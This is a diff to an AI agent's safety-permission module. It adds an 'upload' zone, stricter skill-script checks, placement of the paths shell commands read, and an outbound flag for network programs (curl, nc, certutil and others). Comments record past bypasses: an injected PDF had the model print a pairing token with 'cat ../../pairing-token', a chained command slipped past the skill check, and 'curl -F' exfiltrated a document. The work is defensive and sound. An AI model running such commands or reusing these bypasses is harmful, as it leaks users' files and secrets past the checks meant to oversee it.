@@ -27,7 +27,7 @@ skipped, and `rm -rf ~/Downloads/*` passed every check (decisions.md,
 from __future__ import annotations
 
 import re
-from dataclasses import dataclass
+from dataclasses import dataclass, replace
 from pathlib import Path
 from typing import Any
 
@@ -39,11 +39,12 @@ from agent.safety.call_paths import (
     _shell_paths,
     _strings,
     _trim,
+    pipeline_inputs,
 )
 from agent.safety.scope import Scope, _absolute
-from agent.safety.shell import classify
+from agent.safety.shell import _PYTHON, _operands, classify
+from agent.tools.documents.references import referenced
 
-ZONES = ("workspace", "folders", "elsewhere", "system")
 ACTIONS = ("read", "create", "change", "delete", "run")
 MODES = ("look", "ask", "work")
 
@@ -51,16 +52,29 @@ R, A, X = "run", "ask", "refuse"
 #: mode -> zone -> verdict per action, in ACTIONS order.
 GRID: dict[str, dict[str, tuple[str, str, str, str, str]]] = {
     "look": {"workspace": (R, R, R, R, X), "folders": (R, X, X, X, X),
-             "elsewhere": (A, X, X, X, X), "system": (A, X, X, X, X)},
+             "elsewhere": (A, X, X, X, X), "system": (A, X, X, X, X), "upload": (R, X, X, X, X)},
     "ask": {"workspace": (R, R, R, R, A), "folders": (R, R, A, A, A),
-            "elsewhere": (A, A, A, A, A), "system": (A, X, X, X, X)},
+            "elsewhere": (A, A, A, A, A), "system": (A, X, X, X, X), "upload": (R, R, A, A, A)},
     "work": {"workspace": (R, R, R, R, R), "folders": (R, R, R, A, R),
-             "elsewhere": (A, A, A, A, A), "system": (A, X, X, X, X)},
+             "elsewhere": (A, A, A, A, A), "system": (A, X, X, X, X), "upload": (R, R, A, A, R)},
 }
+#: "upload" is a file the user attached, replaced or deleted by anything but the tools
+#: made to edit a document in place (below): it asks in every mode. A script the model
+#: wrote saved CSV text over an uploaded CSV (2026-11-12); the user's own copy elsewhere
+#: was safe, the one the chat was working from was not.
+EDITS_IN_PLACE = {"edit_docx", "set_cell"}
 
 
 _HOME_FORMS = re.compile(r"^(?:~|\$HOME|\$\{HOME\}|%USERPROFILE%|\$USERPROFILE|\$\{USERPROFILE\})(?=$|[/\\])")
-_SKILL_SCRIPT = re.compile(r"""^\s*(?:python3?|py)(?:\.exe)?\s+["']?\$\{?ATLAS_SKILLS\}?/""")
+_SKILLS_VAR = re.compile(r"\$\{?ATLAS_SKILLS\}?(?=$|[/\\])")
+_URL = re.compile(r"^[A-Za-z][\w+.-]*://")
+#: Programs whose first operand is a pattern or a script, not a file.
+_PATTERN_FIRST = {"grep", "egrep", "fgrep", "rg", "sed", "awk", "gawk", "jq"}
+#: Programs that send or fetch over the network.
+_NETWORK = {"curl", "wget", "scp", "sftp", "ftp", "ssh", "rsync", "nc", "ncat", "netcat", "telnet",
+            "invoke-webrequest", "invoke-restmethod", "iwr", "irm", "certutil", "bitsadmin"}
+#: Programs whose arguments are words, not files.
+_NO_FILES = {"echo", "printf", "expr", "seq", "sleep", "true", "false", "basename", "dirname"}
 
 
 @dataclass(frozen=True)
@@ -71,6 +85,10 @@ class Effect:
     path: Path | None = None
     #: What the user is shown on a card, e.g. the command.
     what: str = ""
+    #: It changes or deletes a file the user attached (the "upload" zone).
+    upload: bool = False
+    #: A command that talks to the network: it asks in every mode, as "elsewhere" does.
+    outbound: bool = False
 
 
 def zone(path: Path | None, scope: Scope, action: str = "read") -> str:
@@ -93,19 +111,35 @@ def verdict(mode: str, where: str, action: str) -> str:
 def effects(name: str, args: dict[str, Any], tool: Any, scope: Scope) -> list[Effect]:
     """What a call does, wherever it can be seen. Tools with no file effect
     (calculate, page tools, skills) have none."""
+    found = _effects(name, args, tool, scope)
+    if name in EDITS_IN_PLACE or not scope.uploads:
+        return found
+    return [replace(e, upload=True) if e.action in ("change", "delete") and e.path is not None
+            and scope.is_upload(e.path) else e for e in found]
+
+
+def _effects(name: str, args: dict[str, Any], tool: Any, scope: Scope) -> list[Effect]:
     from strands.tools.mcp.mcp_agent_tool import MCPAgentTool
 
     out: list[Effect] = []
     raw = args.get("path")
     if name in TOOL_ACTIONS and isinstance(raw, str) and raw:
-        out.append(Effect(TOOL_ACTIONS[name], scope.place(raw)))
+        place = scope.place_new if TOOL_ACTIONS[name] == "create" else scope.place   # as the tool places it
+        out.append(Effect(TOOL_ACTIONS[name], place(raw)))
         dest = args.get("destination")
         if name in DESTINATION_TOOLS and isinstance(dest, str) and dest:
             out.append(Effect("create", scope.place(dest)))
     elif name == "write" and isinstance(raw, str) and raw:
         target = scope.place(raw)
         out.append(Effect("change" if target.exists() else "create", target))
+    out += [Effect("read", scope.place(f)) for f in pipeline_inputs(name, args)]
+    if name == "run_skill" and isinstance(args.get("args"), list):
+        from agent.tools.skills_run import skill_effects
+
+        out += [Effect(action, p) for action, p in skill_effects(args["args"], scope.place)]
     if name == "create_document":
+        # A file a reference copies from is read (documents/references.py).
+        out += [Effect("read", scope.place(f)) for f in referenced(str(args.get("content", "")))]
         for src in _IMAGE.findall(str(args.get("content", ""))):
             src = src.strip().strip("<>")
             if not src.startswith(("asset:", "http://", "https://", "data:")):
@@ -123,11 +157,99 @@ def effects(name: str, args: dict[str, Any], tool: Any, scope: Scope) -> list[Ef
     return out
 
 
+def _redirect(e: Any) -> bool:
+    return "<" in e.program or ">" in e.program
+
+
+def _skill_script(parsed: Any, scope: Scope) -> bool:
+    """Whether the command is one skill script and nothing else: a single simple
+    command (no `;`, `&&`, pipe or `$(...)`), python, its script inside
+    `skills/<skill>/scripts/`. It was a test of how the command starts, so
+    `python "$ATLAS_SKILLS/x.py"; python -c ...` and `$ATLAS_SKILLS/../..` ran
+    whatever followed without asking (2026-11-12)."""
+    commands = [e for e in parsed.effects if not _redirect(e)]
+    skills = scope.protected.skills if scope.protected else None
+    if not parsed.parsed or len(commands) != 1 or skills is None:
+        return False
+    e = commands[0]
+    if not _PYTHON.match(e.program) or not e.args or e.args[0].startswith("-"):
+        return False
+    placed = _place_named(e.args[0], scope, scope.workspace)
+    if not placed or placed[0] is None:
+        return False
+    script, root = _absolute(placed[0]), _absolute(skills)
+    if not _within(script, root):
+        return False
+    inner = script.relative_to(root).parts
+    return len(inner) == 3 and inner[1] == "scripts" and script.suffix == ".py"
+
+
+def _pathlike(word: str) -> bool:
+    """Whether an argument could name a file outside the folder the command runs in.
+    A bare name is in that folder, so it is not placed."""
+    return bool(word) and not _URL.match(word) and (
+        "/" in word or "\\" in word or word.startswith(("~", "$", "%", "..")))
+
+
+def _place_named(raw: str, scope: Scope, cwd: Path | None) -> list[Path | None]:
+    """Where a path a command names is. None: it cannot be placed (a variable, or
+    after a `cd` that cannot be followed), which asks. Empty: not a file to check."""
+    raw = expand_workspace(raw.strip("\"'"), scope.workspace)
+    skills = scope.protected.skills if scope.protected else None
+    if skills is not None:
+        raw = _SKILLS_VAR.sub(lambda _m: Path(skills).as_posix(), raw)
+    raw = _HOME_FORMS.sub(lambda _m: Path.home().as_posix(), raw)
+    if "$" in raw or "%" in raw or raw.startswith("~"):
+        return [None]
+    if re.match(r"^(?:/[A-Za-z]/|[A-Za-z]:[/\\])", raw):
+        return [Path(windows_path(raw))]
+    if raw.startswith("/"):
+        # Git Bash's own tree (`/tmp`, `/etc`). Also what a pattern looks like
+        # (`sed -n '/error/p'`): only a file that is there is one being read.
+        mapped = Path(windows_path(raw))
+        return [mapped] if mapped.exists() else []
+    if cwd is None:
+        return [None]
+    # After a `cd`, from where it led and from the workspace: a `cd` in a subshell
+    # does not move the commands after it, and the stricter place must win.
+    return list(dict.fromkeys([cwd / raw, scope.workspace / raw]))
+
+
+def shell_reads(command: str, scope: Scope) -> list[Path | None]:
+    """Every path a shell command names without writing or deleting it, placed from
+    where the command runs. Writes and deletes were placed, reads were not: `cat
+    ../../pairing-token` from `.data/chats/<id>` ran with no check, and an attached
+    PDF had the model print the extension's token that way (2026-11-12)."""
+    out: list[Path | None] = []
+    cwd: Path | None = scope.workspace
+    for e in classify(command).effects:
+        if e.kind == "install":
+            continue
+        if _redirect(e):
+            names = list(e.paths) if e.kind == "read" else []
+        elif e.program in _NO_FILES:
+            names = []
+        else:
+            names = [a.split("=", 1)[1] for a in e.args if a.startswith("-") and "=" in a]
+            operands = _operands(list(e.args))
+            names += operands[1:] if e.program in _PATTERN_FIRST else operands
+            names = [n for n in names if n not in e.paths]      # its write and delete targets: placed as those
+        placed = [p for n in names if _pathlike(n) or e.program == "cd" for p in _place_named(n, scope, cwd)]
+        out += placed
+        if e.program == "cd":
+            first = placed[0] if placed else None
+            cwd = first if len(_operands(list(e.args))) == 1 and first is not None else None
+    return out
+
+
 def _shell(command: str, scope: Scope) -> list[Effect]:
     parsed = classify(command)
     after_cd = any(e.program == "cd" for e in parsed.effects)
     out: list[Effect] = []
-    skill = bool(_SKILL_SCRIPT.match(command))
+    skill = _skill_script(parsed, scope)
+    # Paths a command names without writing them are read: placed, so Atlas's own
+    # files are refused (the floor) and outside the folders asks.
+    out += [Effect("read", p, command) for p in shell_reads(command, scope)]
     for e in parsed.effects:
         if e.kind in ("write", "delete"):
             for raw in e.paths:
@@ -136,7 +258,10 @@ def _shell(command: str, scope: Scope) -> list[Effect]:
                     "change" if target is not None and target.exists() else "create")
                 out.append(Effect(action, target, command))
         elif e.kind == "other" and not skill:
-            out.append(Effect("run", None, command))
+            # Work mode runs commands unasked; one that can send a file out still asks
+            # (`curl -F f=@report.docx <url>` ran silently there, 2026-11-12). A script can
+            # still open a connection itself: the egress gate (plan, phase 4) is the real fix.
+            out.append(Effect("run", None, command, outbound=e.program in _NETWORK))
     # Paths a command only names (cat, a script's input or output) are read, or
     # written by a skill script: placed, so outside the folders asks.
     for raw in _shell_paths(command):
@@ -157,6 +282,10 @@ def _place_shell(raw: str, scope: Scope, after_cd: bool) -> Path | None:
 
 def placed_or_elsewhere(effect: Effect, scope: Scope) -> str:
     """The zone, with an unplaceable target as "elsewhere"."""
+    if effect.upload:
+        return "upload"
+    if effect.outbound:
+        return "elsewhere"
     if effect.path is None and effect.action != "run":
         return "elsewhere"
     return zone(effect.path, scope, effect.action)
@@ -175,5 +304,5 @@ def _system(path: Path) -> bool:
     return top in ("windows", "program files", "program files (x86)", "programdata")
 
 
-__all__ = ["ACTIONS", "GRID", "MODES", "TOOL_ACTIONS", "ZONES", "Effect", "effects", "placed_or_elsewhere",
-           "verdict", "zone"]
+__all__ = ["ACTIONS", "GRID", "MODES", "TOOL_ACTIONS", "Effect", "effects", "placed_or_elsewhere",
+           "shell_reads", "verdict", "zone"]
